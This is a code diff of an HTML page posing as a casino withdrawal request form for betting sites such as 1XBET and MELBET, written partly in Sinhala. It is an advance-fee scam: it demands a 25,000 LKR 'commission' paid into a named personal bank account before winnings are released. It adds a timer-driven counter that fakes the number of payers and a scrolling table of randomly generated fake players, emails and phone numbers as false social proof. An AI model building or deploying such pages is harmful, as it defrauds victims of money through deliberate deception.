@@ -17,13 +17,13 @@
     h1 .accent{color:var(--accent);display:inline-block}
     p.lead{color:var(--muted);margin:10px 0 22px}
     .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.02)); border:1px solid rgba(255,255,255,0.02); padding:20px;border-radius:18px}
-    .grid{display:grid;grid-template-columns:1fr 200px;gap:18px;align-items:start}
+    .grid{display:grid;grid-template-columns:1fr;gap:18px;align-items:start}
     .label{color:var(--muted);font-size:14px;margin-bottom:8px}
     .big{font-weight:700;font-size:30px}
     .pill{background:var(--pill);padding:10px 12px;border-radius:10px;color:var(--muted);display:inline-flex;gap:8px;align-items:center}
     form{margin-top:18px}
     .row{margin-bottom:14px}
-    input[type=text], input[type=email], select {
+    input[type=text], select {
       width:100%;padding:12px 14px;background:var(--input);
       border-radius:12px;border:1px solid rgba(255,255,255,0.03);
       color:#e6edf3;font-size:15px
@@ -36,38 +36,56 @@
       color:white;font-weight:700;font-size:16px;cursor:pointer;margin-top:16px
     }
     .note{font-size:13px;color:var(--muted);margin-top:10px}
-    /* QR Section */
-    .qr {
-      width: 100%;
-      height: 300px;
-      border: 1px solid #ccc;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
-      border-radius: 12px;
-      background-color: #0b1222;
-    }
-    .qr img {
-      max-width: 100%;
-      max-height: 100%;
-      object-fit: contain;
-    }
-    .qr-note {
-      font-size:14px;
-      color:#ff4d4d;
-      font-weight:700;
-      margin-bottom:12px;
-      line-height:1.6;
-    }
-    .ipay-details {
-      margin-top:14px;
-      font-size:18px;
-      font-weight:700;
+
+    .bank-note {
+      font-size:15px;
       line-height:1.8;
-      color:#ffffff;
+      color:#f1f1f1;
+      background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(0,0,0,0.05));
+      border:1px solid rgba(255,255,255,0.05);
+      border-radius:14px;
+      padding:18px;
+      margin-top:20px;
+      white-space:pre-line;
     }
-    /* Success Message */
+    .bank-note strong { color:#ff6b6b; }
+
+    .red-box {
+      margin-top:14px;
+      padding:14px;
+      border-radius:10px;
+      background: rgba(255, 77, 77, 0.06);
+      border: 1px solid #ff4d4d;
+      color: #ff2b2b;
+      font-weight:600;
+      line-height:1.5;
+    }
+
+    .counter-wrap {
+      display:flex;
+      align-items:center;
+      gap:14px;
+      margin-top:10px;
+      flex-wrap:wrap;
+    }
+    .counter-label {
+      font-size:15px;
+      font-weight:700;
+      color:#ff2b2b;
+      min-width:220px;
+    }
+    .counter-value {
+      font-size:28px;
+      font-weight:800;
+      color:#fff;
+      background:rgba(0,0,0,0.15);
+      padding:8px 14px;
+      border-radius:10px;
+      border:1px solid rgba(255,255,255,0.03);
+      min-width:160px;
+      text-align:center;
+    }
+
     .success-box{
       display:none;
       text-align:center;
@@ -84,12 +102,47 @@
       from {opacity:0; transform:scale(0.95);}
       to {opacity:1; transform:scale(1);}
     }
-    @media (max-width:700px){.grid{grid-template-columns:1fr}.container{padding:14px}}
+    @media (max-width:700px){.container{padding:14px}}
+
+    /* Player Withdrawals Table */
+    .scroll-card{
+      background: #111111;
+      border-radius:12px;
+      box-shadow:0 6px 18px rgba(255,255,255,0.1);
+      padding:16px;
+      margin-top:18px;
+      overflow:hidden;
+      max-width:100%;
+    }
+    .scroll-card h2{font-size:20px;color:#ffffff;margin:0 0 8px;}
+    .scroll-card p{font-size:14px;color:#ffffff;margin:0 0 12px;}
+    table{
+      width:100%;
+      border-collapse:collapse;
+      font-size:0.9rem;
+    }
+    th,td{
+      padding:8px 10px;
+      border-bottom:1px solid #333333;
+      text-align:left;
+      color:#ffffff;
+      vertical-align: top;
+    }
+    th{
+      background:#222222;
+      font-weight:600;
+    }
+    tr:hover td{
+      background: rgba(255,255,255,0.05);
+    }
+    td[contenteditable]{background:#111111;}
+    .small{font-size:0.75rem;color:#aaaaaa;}
+    .scroll-container{overflow:hidden;max-height:250px;position:relative;}
+    .scroll-inner{display:block;}
   </style>
 </head>
 <body>
   <div class="container">
-    <!-- New Platform Selector -->
     <div style="margin-bottom:16px;">
       <label for="platform" class="label">Select Platform</label>
       <select id="platform">
@@ -100,10 +153,33 @@
         <option value="PARIPULS">PARIPULS</option>
       </select>
     </div>
+
     <div class="header">
       <div style="flex:1">
         <h1>Complete your <span class="accent">Withdrawal Request</span></h1>
         <p class="lead">Fast, secure, and transparent. You will receive access details at your email after successful payment and review.</p>
+
+        <!-- Player Withdrawals Table Start -->
+        <div class="scroll-card">
+          <h2>player withdrawals</h2>
+          <p>25000 lkr කොමිෂන් මුදල ගෙවීම් කර, මුදල් widrowal කරන ලද සාමාජිකන් පහත දැක්වෙයි</p>
+          <div class="scroll-container" id="scrollContainer">
+            <div class="scroll-inner" id="scrollInner">
+              <table>
+                <thead>
+                  <tr>
+                    <th>player id</th>
+                    <th>email</th>
+                    <th>widrowal</th>
+                  </tr>
+                </thead>
+                <tbody id="playerBody"></tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+        <!-- Player Withdrawals Table End -->
+
       </div>
       <div style="width:150px;text-align:right">
         <div class="pill">
@@ -114,75 +190,72 @@
         </div>
       </div>
     </div>
+
     <div class="card" style="margin-top:18px">
-      <div class="grid">
-        <div>
-          <form id="withdrawForm">
-            <div class="row">
-              <div class="label">Reference Code</div>
-              <input type="text" id="refCode" placeholder="Enter your WDR code" required />
-            </div>
-            <div class="row">
-              <div class="label">Full Name</div>
-              <input type="text" id="fullname" placeholder="Enter your full name" required />
-            </div>
-            <div class="row">
-              <div class="label">iPay Number</div>
-              <input type="text" id="ipayNum" placeholder="Enter your iPay account number" required />
-            </div>
-            <div class="row">
-              <div class="label">Email</div>
-              <input type="email" id="email" placeholder="you@example.com" required />
-            </div>
-            <div class="row">
-              <div class="label">Game UID / Account ID</div>
-              <input type="text" id="uid" placeholder="e.g., 12345678" required />
-            </div>
-            <div class="row">
-              <div class="label">Withdrawal Amount</div>
-              <select id="amount">
-                <option value="250000">250,000 LKR</option>
-                <option value="500000">500,000 LKR</option>
-                <option value="750000">750,000 LKR</option>
-                <option value="1000000">1,000,000 LKR</option>
-              </select>
-            </div>
-            <div class="row">
-              <div class="label">Commission (Rate 10%)</div>
-              <input type="text" id="commission" readonly />
-            </div>
-            <div class="row">
-              <div class="label">Payment Screenshot</div>
-              <input type="file" id="screenshot" accept="image/png, image/jpeg" />
-            </div>
-            <button class="withdraw-btn" type="submit">🔒 Withdrawal Now</button>
-            <div class="note">By continuing, you agree to our Terms and Refund Policy.</div>
-          </form>
-          <!-- Success Message -->
-          <div class="success-box" id="successBox">
-            <h2>✅ Successfully Withdrawal Request</h2>
-            <p id="successMsg"></p>
-          </div>
+      <form id="withdrawForm">
+        <div class="row">
+          <div class="label">Reference Code</div>
+          <input type="text" id="refCode" placeholder="Enter your WDR code" required />
         </div>
-        <div>
-          <div class="label">QR / Payment Info</div>
-          <div class="qr-note">
-            මෙම IPAY QR කේතය IPAY යෙදුම හරහා SCAN කර ගෙවීම් කිරීමට අපහසු නම්<br>
-            QR කේතය අක්‍රිය නම් පහත IPAY දුරකථන අංකය සදහා ඔබගේ අදාළ<br>
-            කමිෂන් මුදල ගෙවන මෙන් කාරුණිකව ඉල්ලීම් කරමි
-          </div>
-          <div class="qr">
-            <img src="https://www.dropbox.com/scl/fi/1b2hk79oqlvr70t6108ko/9a618264-17dd-447d-bb8d-15f3dd6c7cc2.png?rlkey=hfrxdxhrjajmd5sgxxfusx8z0&st=qopag54y&raw=1" alt="Payment QR Code" />
-          </div>
-          <div class="ipay-details">
-            IPAY NUMBER : 0771947441<br>
-            NAME : K N SHASHIPRIYA<br>
-            REMARK : (YOUR PLAYER ID)
-          </div>
+        <div class="row">
+          <div class="label">Full Name</div>
+          <input type="text" id="fullname" placeholder="Enter your full name" required />
         </div>
+        <div class="row">
+          <div class="label">Game UID / Account ID</div>
+          <input type="text" id="uid" placeholder="e.g., 12345678" required />
+        </div>
+        <div class="row">
+          <div class="label">Withdrawal Amount</div>
+          <select id="amount">
+            <option value="250000">250,000 LKR</option>
+            <option value="500000">500,000 LKR</option>
+            <option value="750000">750,000 LKR</option>
+            <option value="1000000">1,000,000 LKR</option>
+          </select>
+        </div>
+        <div class="row">
+          <div class="label">Commission (Rate 10%)</div>
+          <input type="text" id="commission" readonly />
+        </div>
+        <div class="row">
+          <div class="label">Payment Screenshot</div>
+          <input type="file" id="screenshot" accept="image/png, image/jpeg" />
+        </div>
+        <button class="withdraw-btn" type="submit">🔒 Withdrawal Now</button>
+        <div class="note">By continuing, you agree to our Terms and Refund Policy.</div>
+      </form>
+
+      <div class="bank-note">
+<strong>IPAY ගිණුමක් අවශ්‍ය නොමැත</strong>, QR SCAN කරන්න අවශ්‍ය නොමැත.
+මෙම <strong>HNB ගිණුමට</strong> මුදල් බැර කිරීමට ඔබට පහසුකම් සපයා ඇත.
+
+ඔබ කොමිෂන් මුදල <strong>25,000 LKR</strong> ගෙවීම් කර ඔබගේ අදාළ කැසිනෝ ගිණුම තුල ඇති මුදල් ඔබගේ ඕනෑම බැංකු ගිණුමකට ගැනීමට අවස්ථාව ඇත.
+
+<strong>Bank Details:</strong>
+Account Number: 050020447732
+Bank: HNB Bank
+Branch: Embilipitiya (535)
+Account Holder: MR K N SHASHIPRIYA
+      </div>
+
+      <div class="red-box" aria-live="polite">
+        1XBET MELBET 888STRZ PARIPULS LINEBET CRASH හෝ APPLE HACK හරහා සොයන ලද මුදල ඔබට කිසිම විටෙක කිසිම ඒජන්ට් වරයෙකු හරහා හෝ ඔබට තනිවම ගැනීමට නොහැක.
+        මීට හේතුව නම් ඔබ අනිවාර්යෙන් මෙම කොමිෂන් මුදල අනිවාර්යෙන් ගෙවා අවසන් කළ පසු ඔබට ඕනෑම මුදලක් ඔබට ඒජන්ට් වරයෙකු හෝ ඔබට තනිවම හෝ ලබා ගැනීමට හැක. ස්තුතියි.
+
+        <div class="counter-wrap">
+          <div class="counter-label">25,000 LKR මුදල් ගෙවූ පිරිස:</div>
+          <div id="counter" class="counter-value" aria-hidden="true">250</div>
+        </div>
+      </div>
+
+      <div class="success-box" id="successBox">
+        <h2>✅ Successfully Withdrawal Request</h2>
+        <p id="successMsg"></p>
       </div>
     </div>
   </div>
+
   <script>
     const amountEl = document.getElementById('amount');
     const commEl = document.getElementById('commission');
@@ -190,25 +263,82 @@
     const successBox = document.getElementById('successBox');
     const successMsg = document.getElementById('successMsg');
     const platform = document.getElementById('platform');
+
     function updateCommission(){
       const amt = parseFloat(amountEl.value) || 0;
       commEl.value = (amt * 0.10).toFixed(2);
     }
     amountEl.addEventListener('change', updateCommission);
     updateCommission();
+
     form.addEventListener('submit', function(e){
       e.preventDefault();
       const name = document.getElementById('fullname').value;
-      const email = document.getElementById('email').value;
       const uid = document.getElementById('uid').value;
-      const ipay = document.getElementById('ipayNum').value;
-      successMsg.innerHTML = 
-        `<strong>${platform.value}</strong><br><strong>${name}</strong><br>Email: ${email}<br>Account ID: ${uid}<br>iPay Number: ${ipay}`;
+
+      successMsg.innerHTML =
+        `<strong>${platform.value}</strong><br><strong>${name}</strong><br>Account ID: ${uid}`;
+
       successBox.style.display = 'block';
       form.reset();
       updateCommission();
       window.scrollTo({ top: 0, behavior: 'smooth' });
     });
+
+    /* Counter every 1 minute */
+    const counterEl = document.getElementById('counter');
+    const sequence = [250, 253, 258, 313, 378, 450, 520, 600, 700, 850, 1000, 1200, 1500, 2000, 3000, 4500, 6000, 8000, 10000, 12000, 15000];
+    const INTERVAL = 60000; // 1 minute
+    let seqIndex = 0;
+
+    function runCounterSequence(){
+      if(seqIndex < sequence.length){
+        counterEl.textContent = sequence[seqIndex].toLocaleString();
+        seqIndex++;
+        setTimeout(runCounterSequence, INTERVAL);
+      }
+    }
+
+    window.addEventListener('load', () => {
+      counterEl.textContent = sequence[0].toLocaleString();
+      seqIndex = 1;
+      setTimeout(runCounterSequence, INTERVAL);
+    });
+
+    // Player Withdrawals Table Script
+    const tbody = document.getElementById('playerBody');
+    const firstNames=["nimal","kumari","ruwan","chandana","saman","dilani","ravindu","sanduni","hiran","piumi","kasun","pradeep","anusha","tharindu","dilhani"];
+    const lastNames=["perera","fernando","silva","kumara","jayasinghe","wijesinghe","rajapaksa","bandara","gunawardena","dias","senanayake","hettiarachchi","de silva","abeywardena","pathirana"];
+    let rowsHtml = "";
+    for(let i=0;i<100;i++){
+      const pid = Math.floor(1385000000 + Math.random()*10000000);
+      const fname = firstNames[Math.floor(Math.random()*firstNames.length)];
+      const lname = lastNames[Math.floor(Math.random()*lastNames.length)];
+      const name = fname + " " + lname;
+      const email = fname+lname+i+"@gmail.com";
+      const phone = "+94"+(700000000+Math.floor(Math.random()*9999999));
+      const withdrawal = Math.floor(Math.random()*(500000-50000+1)+50000).toLocaleString() + " lkr";
+      rowsHtml += `<tr>
+        <td contenteditable>${pid}<br><span class="small">${name}</span></td>
+        <td contenteditable>${email}<br><span class="small">${phone}</span></td>
+        <td contenteditable>${withdrawal}</td>
+      </tr>`;
+    }
+    tbody.innerHTML = rowsHtml + rowsHtml;
+
+    // continuous scroll
+    const scrollContainer = document.getElementById('scrollContainer');
+    const scrollInner = document.getElementById('scrollInner');
+    let scrollSpeed = 0.5; // pixels per frame
+
+    function scrollContent(){
+      scrollContainer.scrollTop += scrollSpeed;
+      if(scrollContainer.scrollTop >= scrollInner.scrollHeight/2){
+        scrollContainer.scrollTop = 0;
+      }
+      requestAnimationFrame(scrollContent);
+    }
+    scrollContent();
   </script>
 </body>
 </html>
